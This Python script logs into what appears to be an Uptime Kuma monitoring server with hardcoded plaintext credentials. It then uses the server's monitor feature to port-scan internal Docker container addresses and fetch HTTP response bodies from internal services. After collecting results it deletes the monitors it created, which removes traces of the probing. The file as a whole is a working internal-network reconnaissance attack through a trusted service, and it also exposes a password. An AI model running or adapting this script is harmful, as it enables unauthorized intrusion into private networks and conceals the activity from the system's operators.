import json,sys,time,threading,base64,gzip,zlib
import websocket
try:
    import brotli
except Exception:
    brotli=None
OUT=[]
def log(*a):
    s=" ".join(str(x) for x in a); print(s,flush=True); OUT.append(s)
def dec(x):
    if not x: return ""
    try: raw=base64.b64decode(x)
    except Exception: return ""
    for fn in (lambda b: brotli.decompress(b) if brotli else (_ for _ in ()).throw(Exception()),
               gzip.decompress, zlib.decompress):
        try: return fn(raw).decode("utf8","replace")
        except Exception: pass
    return raw.decode("utf8","replace")
URL="ws://103.40.14.130:3101/socket.io/?EIO=4&transport=websocket"
ws=None
for a in range(4):
    try:
        ws=websocket.create_connection(URL,timeout=25); break
    except Exception as e:
        log("CONN_ERR",a,type(e).__name__,str(e)[:160]); time.sleep(4)
if ws is None:
    open("r733c.txt","w").write("\n".join(OUT)); sys.exit(0)
acks={}; lock=threading.Lock(); pushes=[]
def reader():
    while True:
        try: m=ws.recv()
        except Exception: return
        if not isinstance(m,str): continue
        if m=="2":
            try: ws.send("3")
            except Exception: return
            continue
        if m.startswith("43"):
            j=m[2:]; i=0
            while i<len(j) and j[i].isdigit(): i+=1
            try: acks[int(j[:i])]=json.loads(j[i:])
            except Exception: continue
            continue
        pushes.append((time.time(),m))
threading.Thread(target=reader,daemon=True).start()
seq=[1]
def emit(ev,data=None,wait=15):
    a=seq[0]; seq[0]+=1
    msg="42%d%s"%(a,json.dumps([ev,data])) if data is not None else "42%d%s"%(a,json.dumps([ev]))
    try: ws.send(msg)
    except Exception as e: log("SEND_ERR",ev,str(e)[:80]); return None
    end=time.time()+wait
    while time.time()<end:
        with lock:
            if a in acks: return acks.pop(a)
        time.sleep(0.05)
    return None
ws.send("40"); time.sleep(1.5)
r=emit("login",{"username":"muhan","password":"Liu310013.","token":""},20)
try: tok=r[0].get("token")
except Exception: tok=None
log("LOGIN","OK" if tok else "FAIL",str(r)[:120])
if not tok:
    open("r733c.txt","w").write("\n".join(OUT)); sys.exit(0)
def monmap():
    emit("getMonitorList",None,12); time.sleep(2.2)
    for ts,m in pushes[::-1]:
        if m.startswith("42") and '"monitorList"' in m:
            try:
                arr=json.loads(m[2:])
                if isinstance(arr,list) and arr and arr[0]=="monitorList" and isinstance(arr[1],dict):
                    return {int(k):v for k,v in arr[1].items()}
            except Exception: pass
    return {}
PRE=("zz733","zz714","zzp-","ctl-","d17-","d18-","pub-")
m0=monmap()
log("MON_BEFORE",json.dumps({k:v.get("name") for k,v in m0.items()})[:800])
n=0
for mid,mv in list(m0.items()):
    if str(mv.get("name","")).startswith(PRE):
        emit("deleteMonitor",mid,5); n+=1
log("CLEANED",n)
def add(mon):
    rr=emit("add",mon,15)
    try: return rr[0].get("monitorID")
    except Exception: return None
def P(nm,h,p,to=8):
    return {"name":nm,"type":"port","hostname":h,"port":int(p),"interval":60,"maxretries":0,"timeout":to,
            "active":True,"notificationIDList":{},"conditions":[],"accepted_statuscodes":["200-299"],"saveResponse":False}
def H(nm,u,to=12):
    return {"name":nm,"type":"http","url":u,"method":"GET","interval":60,"maxretries":0,
            "accepted_statuscodes":["100-599"],"timeout":to,"active":True,"saveResponse":True,
            "saveErrorResponse":True,"responseMaxLength":1200,"notificationIDList":{},
            "conditions":[],"ignoreTls":True,"cacheBust":False,"headers":"{}","maxredirects":2}
tests=[]
def tp(nm,fn,*a):
    mid=add(fn(nm,*a)); tests.append((nm,mid))
# positive/negative controls
tp("zz733-ctl-pub24678",P,"103.40.14.130",24678)
tp("zz733-ctl-bh",P,"10.255.255.1",80)
# container IPs on 32311 (vibecode) and a couple of interesting ports
for i in range(1,31):
    for net in ("172.17.0","172.18.0"):
        ip="%s.%d"%(net,i)
        tp("zz733-c32311-%s"%ip.replace(".","_"),P,ip,32311)
for i in range(1,21):
    tp("zz733-c3001-172_17_0_%d"%i,P,"172.17.0.%d"%i,3001)
    tp("zz733-c5278-172_18_0_%d"%i,P,"172.18.0.%d"%i,5278)
log("ADDED",len([t for t in tests if t[1]]),"of",len(tests))
time.sleep(130)
hbs={}
for ts,m in list(pushes):
    if m.startswith("42") and '"heartbeat"' in m:
        try:
            arr=json.loads(m[2:])
            if isinstance(arr,list) and len(arr)>1 and isinstance(arr[1],dict):
                b=arr[1]
                if b.get("monitorID") is not None:
                    hbs.setdefault(int(b["monitorID"]),[]).append(b)
        except Exception: pass
log("HB_MONITORS",len(hbs))
ups=[]
for nm,mid in tests:
    if not mid: continue
    bs=hbs.get(mid) or []
    if not bs:
        rr=emit("getMonitorBeats",[mid,1],8)
        try: bs=rr[0].get("data") or []
        except Exception: bs=[]
    if not bs:
        log("R %s NOBEAT"%nm); continue
    b=bs[-1]
    st=b.get("status")
    log("R %s st=%s msg=%s"%(nm,st,str(b.get("msg"))[:60]))
    if st==1: ups.append(nm)
log("UPS",json.dumps(ups))
# follow-up http on ups
for nm in ups:
    parts=nm.split("-")
    ip=parts[-1].replace("_",".")
    tp("zz733-http-%s"%nm[6:],H,"http://%s:32311/"%ip)
    tp("zz733-http2-%s"%nm[6:],H,"http://%s:3001/"%ip)
time.sleep(90)
hbs={}
for ts,m in list(pushes):
    if m.startswith("42") and '"heartbeat"' in m:
        try:
            arr=json.loads(m[2:])
            if isinstance(arr,list) and len(arr)>1 and isinstance(arr[1],dict):
                b=arr[1]
                if b.get("monitorID") is not None:
                    hbs.setdefault(int(b["monitorID"]),[]).append(b)
        except Exception: pass
for nm,mid in tests:
    if not nm.startswith("zz733-http") or not mid: continue
    bs=hbs.get(mid) or []
    if not bs:
        rr=emit("getMonitorBeats",[mid,1],8)
        try: bs=rr[0].get("data") or []
        except Exception: bs=[]
    if not bs: log("R %s NOBEAT"%nm); continue
    b=bs[-1]
    log("R %s st=%s msg=%s body=%s"%(nm,b.get("status"),str(b.get("msg"))[:80],dec(b.get("response")).replace("\n"," ")[:400]))
d=0
for mid,mv in monmap().items():
    if str(mv.get("name","")).startswith("zz733"):
        emit("deleteMonitor",mid,4); d+=1
log("DELETED",d)
log("MON_AFTER",json.dumps({k:v.get("name") for k,v in monmap().items()})[:400])
open("r733c.txt","w").write("\n".join(OUT))
